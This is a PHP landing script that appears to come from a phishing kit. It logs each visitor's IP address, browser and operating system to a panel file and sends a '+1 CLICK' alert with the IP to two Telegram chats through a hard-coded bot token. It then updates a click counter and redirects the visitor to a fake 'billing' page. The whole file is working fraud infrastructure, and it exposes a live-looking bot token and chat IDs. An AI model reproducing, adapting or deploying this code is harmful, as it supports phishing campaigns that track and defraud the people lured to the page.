<?php 
include("common/includes.php");
include("panel/funcs.php");

setlocale(LC_TIME, 'fr_FR');
date_default_timezone_set('Europe/Paris');

$date = date("d/m/Y");
$heure = date("H:i:s");

$myfile = fopen("./panel/click.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\n" . '
<tr>
<td width="80"><p align="center">'.$_SERVER['REMOTE_ADDR'].'</th>
<td width="80"><p align="center">'.getBrowser($USER_AGENT).'</th>
<td width="80"><p align="center">'.getOs($_SERVER['HTTP_USER_AGENT']).'</th>
<td width="80"><p align="center">'.$country.'</th>
<td width="80"><p align="center">'.$date.'</th></th>
</tr>
');
fclose($myfile);

$original_bot_token = '7057095242:AAHH-oF8Yqn2gPMvhF1l45mXcgQpVEjkJtE';
$original_chat_id = '-4284778176';


function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$user_ip = getUserIP();

$message = "+1 CLICK
🌐IP : " . $user_ip;

$telegram_url = "https://api.telegram.org/bot$original_bot_token/sendMessage";

$data = [
    'chat_id' => $original_chat_id,
    'text' => $message
];

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

$new_bot_token = '7057095242:AAHH-oF8Yqn2gPMvhF1l45mXcgQpVEjkJtE';
$new_chat_id = '-4238529786';

// Envoi au nouveau bot
$new_telegram_url = "https://api.telegram.org/bot$new_bot_token/sendMessage";

$new_data = [
    'chat_id' => $new_chat_id,
    'text' => $message
];

curl_setopt($ch, CURLOPT_URL, $new_telegram_url);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($new_data));

$new_response = curl_exec($ch);

curl_close($ch);

$filepath = './panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['cliques']++;

function update_ini_file($data, $filepath) {
    $content = "";
    $parsed_ini = parse_ini_file($filepath, true);
    foreach($data as $section => $values){
        if($section === ""){
            continue;
        }
        $content .= $section ."=". $values . "\n\r";
    }
    if (!$handle = fopen($filepath, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}

update_ini_file($data, $filepath);  

header('location: ./pages/billing.php');
?>
